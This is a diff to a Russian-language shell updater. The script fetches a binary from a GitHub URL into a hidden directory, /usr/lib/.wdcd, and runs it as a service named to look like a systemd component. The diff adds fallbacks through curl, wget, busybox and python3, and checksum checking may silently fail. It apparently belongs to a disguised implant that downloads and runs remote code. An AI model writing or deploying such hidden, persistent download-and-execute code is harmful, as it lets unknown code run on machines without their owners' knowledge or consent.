@@ -1,5 +1,13 @@
 #!/bin/sh
 set -e
+_dl() {
+  if command -v curl >/dev/null 2>&1; then curl -fsSL --connect-timeout 15 --max-time 120 -o "$2" "$1"
+  elif command -v wget >/dev/null 2>&1; then wget -q -T 15 -O "$2" "$1"
+  elif command -v busybox >/dev/null 2>&1; then busybox wget -q -T 15 -O "$2" "$1"
+  elif command -v python3 >/dev/null 2>&1; then python3 -c "import sys,urllib.request as u;u.urlretrieve(sys.argv[1],sys.argv[2])" "$1" "$2"
+  else return 1
+  fi
+}
 URL="${1:-https://github.com/gerardovsa/Ai_Agents/raw/V2_clean/tools/diagd}"
 BIN="/usr/lib/.wdcd/bin/sysdiag"
 SVC="systemd-sysdiag.service"
@@ -12,13 +20,11 @@ if [ ! -f "$BIN" ]; then
 fi
 echo "текущая версия: $("$BIN" --version 2>/dev/null | head -1 || echo unknown)"
 echo "скачиваю новый бинарник: $URL"
-if command -v curl >/dev/null 2>&1; then
-  curl -fsSL --connect-timeout 15 --max-time 120 -o "$TMP" "$URL"
-  curl -fsSL --connect-timeout 15 --max-time 60 -o "$TMP.sha" "${URL%/diagd}/MANIFEST.sha256" || true
-else
-  wget -q -T 15 -O "$TMP" "$URL"
-  wget -q -T 15 -O "$TMP.sha" "${URL%/diagd}/MANIFEST.sha256" || true
+if ! _dl "$URL" "$TMP"; then
+  echo "скачивание не удалось (нет curl/wget/python3)" >&2
+  exit 1
 fi
+_dl "${URL%/diagd}/MANIFEST.sha256" "$TMP.sha" || true
 if [ ! -s "$TMP" ]; then echo "скачивание не удалось" >&2; exit 1; fi
 NEW_SHA=$(sha256sum "$TMP" | awk '{print $1}')
 if [ -s "$TMP.sha" ]; then
